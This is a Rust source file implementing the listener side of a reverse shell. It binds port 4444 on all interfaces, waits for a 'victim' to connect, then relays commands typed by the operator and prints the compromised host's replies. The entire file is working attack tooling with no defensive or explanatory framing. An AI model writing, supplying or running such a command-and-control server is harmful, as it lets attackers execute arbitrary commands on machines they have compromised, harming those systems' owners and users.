use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};

pub fn start_reverse_shell_server() -> Result<(), io::Error> {
    let listener = TcpListener::bind("0.0.0.0:4444")?; // Listen on all interfaces
    println!("Reverse shell server started. Waiting for victim...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("Victim connected: {}", stream.peer_addr()?);
                handle_victim(stream)?; // Handle the victim's session
            }
            Err(e) => eprintln!("Failed to accept connection: {}", e),
        }
    }

    Ok(())
}

fn handle_victim(mut stream: TcpStream) -> Result<(), io::Error> {
    let mut reader = BufReader::new(stream.try_clone()?);

    loop {
        print!("Enter command to send to victim (or 'exit' to disconnect): ");
        io::stdout().flush()?;
        let mut command = String::new();
        io::stdin().read_line(&mut command)?;

        let command = command.trim();
        if command.eq_ignore_ascii_case("exit") {
            println!("Disconnecting from victim...");
            break;
        }

        // Send the command
        stream.write_all(command.as_bytes())?;
        stream.write_all(b"\n")?;

        // Read the response
        let mut response = String::new();
        reader.read_line(&mut response)?;
        if response.is_empty() {
            println!("Victim disconnected.");
            break;
        }

        println!("Response:\n{}", response);
    }

    Ok(())
}
